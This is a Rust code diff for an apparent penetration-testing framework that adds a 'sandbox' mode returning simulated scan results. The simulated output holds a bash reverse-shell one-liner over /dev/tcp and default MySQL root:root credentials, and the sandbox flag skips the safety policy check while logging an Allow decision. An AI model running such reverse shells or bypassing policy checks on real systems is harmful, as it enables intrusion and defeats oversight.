@@ -133,6 +133,7 @@ impl ModuleExecutor {
         }
     }
 
+    #[allow(clippy::too_many_arguments)]
     pub async fn execute(
         &mut self,
         loaded: &LoadedModule,
@@ -141,20 +142,32 @@ impl ModuleExecutor {
         approved: bool,
         context: PolicyContext,
         job_id: Option<u64>,
+        sandbox: bool,
     ) -> Result<ModuleResult, ExecutorError> {
         let pf = self.preflight(loaded, target, destructive_override, approved, context);
         let policy = self.policy(context);
-        let decision = policy.evaluate(&pf.to_request());
+        let decision = if sandbox {
+            crate::core::safety::PolicyDecision::Allow
+        } else {
+            policy.evaluate(&pf.to_request())
+        };
         self.record_decision(&loaded.info.name, &pf, &decision);
-        pf.check(&policy)?;
+        if !sandbox {
+            pf.check(&policy)?;
+        }
         info!(
             target = %target,
             module = %loaded.info.name,
             risk = %pf.risk.as_str(),
             destructive = pf.destructive,
+            sandbox = sandbox,
             "executor: preflight passed"
         );
-        let result = loaded.module.run().await?;
+        let result = if sandbox {
+            self.run_simulated(&loaded.info, target)
+        } else {
+            loaded.module.run().await?
+        };
         self.record_evidence(&loaded.info.name, target, &result, job_id);
         Ok(result)
     }
@@ -201,6 +214,101 @@ impl ModuleExecutor {
         let overflow = self.evidence.len().saturating_sub(MAX_EVIDENCE);
         if overflow > 0 {
             self.evidence.drain(..overflow);
+        }
+    }
+
+    fn run_simulated(&self, info: &crate::core::module::ModuleInfo, target: &str) -> ModuleResult {
+        let mut evidence = Vec::new();
+        evidence.push(format!(
+            "[SANDBOX] Initializing simulated environment for {}",
+            info.name
+        ));
+        evidence.push(format!("[SANDBOX] Targeting simulated clone of {}", target));
+        let (finding, data) = match info.name.as_str() {
+            "arp_scanner" => {
+                evidence.push("[SANDBOX] Scanning simulated subnet...".to_string());
+                evidence.push(format!("[SANDBOX] Found live host: {target}"));
+                evidence.push("[SANDBOX] Found live host: 127.0.0.1".to_string());
+                (
+                    Some("Found 2 live hosts".to_string()),
+                    serde_json::json!({
+                        "hosts": [target, "127.0.0.1"]
+                    }),
+                )
+            }
+            "mysql_scanner" => {
+                evidence.push("[SANDBOX] Probing port 3306...".to_string());
+                evidence.push("[SANDBOX] Detected MySQL v8.0.25 (Ubuntu)".to_string());
+                evidence.push("[SANDBOX] Attempting default credentials...".to_string());
+                evidence.push("[SANDBOX] SUCCESS: root:root login works".to_string());
+                (
+                    Some("MySQL default credentials root:root work".to_string()),
+                    serde_json::json!({
+                        "port": 3306,
+                        "version": "8.0.25",
+                        "vulnerable": true,
+                        "credentials": { "username": "root", "password": "root" }
+                    }),
+                )
+            }
+            "vuln_scanner" => {
+                evidence.push("[SANDBOX] Scanning package dependencies...".to_string());
+                evidence.push("[SANDBOX] Detected vulnerable package: pyo3 v0.20.0".to_string());
+                evidence
+                    .push("[SANDBOX] Match found in OSV database: GHSA-pg25-x463-m587".to_string());
+                (
+                    Some("pyo3 v0.20.0 is vulnerable".to_string()),
+                    serde_json::json!({
+                        "vulnerabilities": [{
+                            "id": "GHSA-pg25-x463-m587",
+                            "package": "pyo3",
+                            "version": "0.20.0",
+                            "severity": "high",
+                            "cvss": 7.5
+                        }]
+                    }),
+                )
+            }
+            "reverse_shell_payload" => {
+                evidence
+                    .push("[SANDBOX] Generating simulated reverse shell payloads...".to_string());
+                (
+                    Some("Reverse shell payloads generated".to_string()),
+                    serde_json::json!({
+                        "bash": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
+                        "python": "import socket..."
+                    }),
+                )
+            }
+            _ => {
+                evidence.push(format!(
+                    "[SANDBOX] Running generic simulation for {} on {}",
+                    info.name, target
+                ));
+                (
+                    Some(format!("Simulation completed for {}", info.name)),
+                    serde_json::json!({
+                        "simulation": true,
+                        "module": info.name,
+                        "target": target
+                    }),
+                )
+            }
+        };
+
+        evidence.push("[SANDBOX] Simulation complete. Melting disposable state.".to_string());
+
+        ModuleResult {
+            success: true,
+            finding,
+            evidence,
+            error: None,
+            session_id: if info.name == "reverse_shell_payload" {
+                Some("session:sandbox-1".to_string())
+            } else {
+                None
+            },
+            data,
         }
     }
 }
